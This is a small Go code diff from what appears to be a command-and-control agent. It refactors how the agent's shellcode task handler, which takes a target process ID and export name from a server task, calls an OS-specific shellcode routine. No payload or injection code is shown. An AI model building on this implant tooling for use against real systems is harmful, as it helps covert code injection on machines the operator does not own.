@@ -30,7 +30,8 @@ func (a *Agent) orchestrateShellcode(task models.ServerTaskResponse) models.Agen
 		task.TaskID, args.TargetPID, args.ExportName)
 
 	// Call the "doer" function
-	shellcodeResult, err := shellcode.DoShellcode(args)
+	commandShellcode := shellcode.New()                        // create os-specific Download struct ("decided" when compiled)
+	shellcodeResult, err := commandShellcode.DoShellcode(args) // Call the interface method
 
 	// Prepare the final TaskResult
 	finalResult := models.AgentTaskResult{
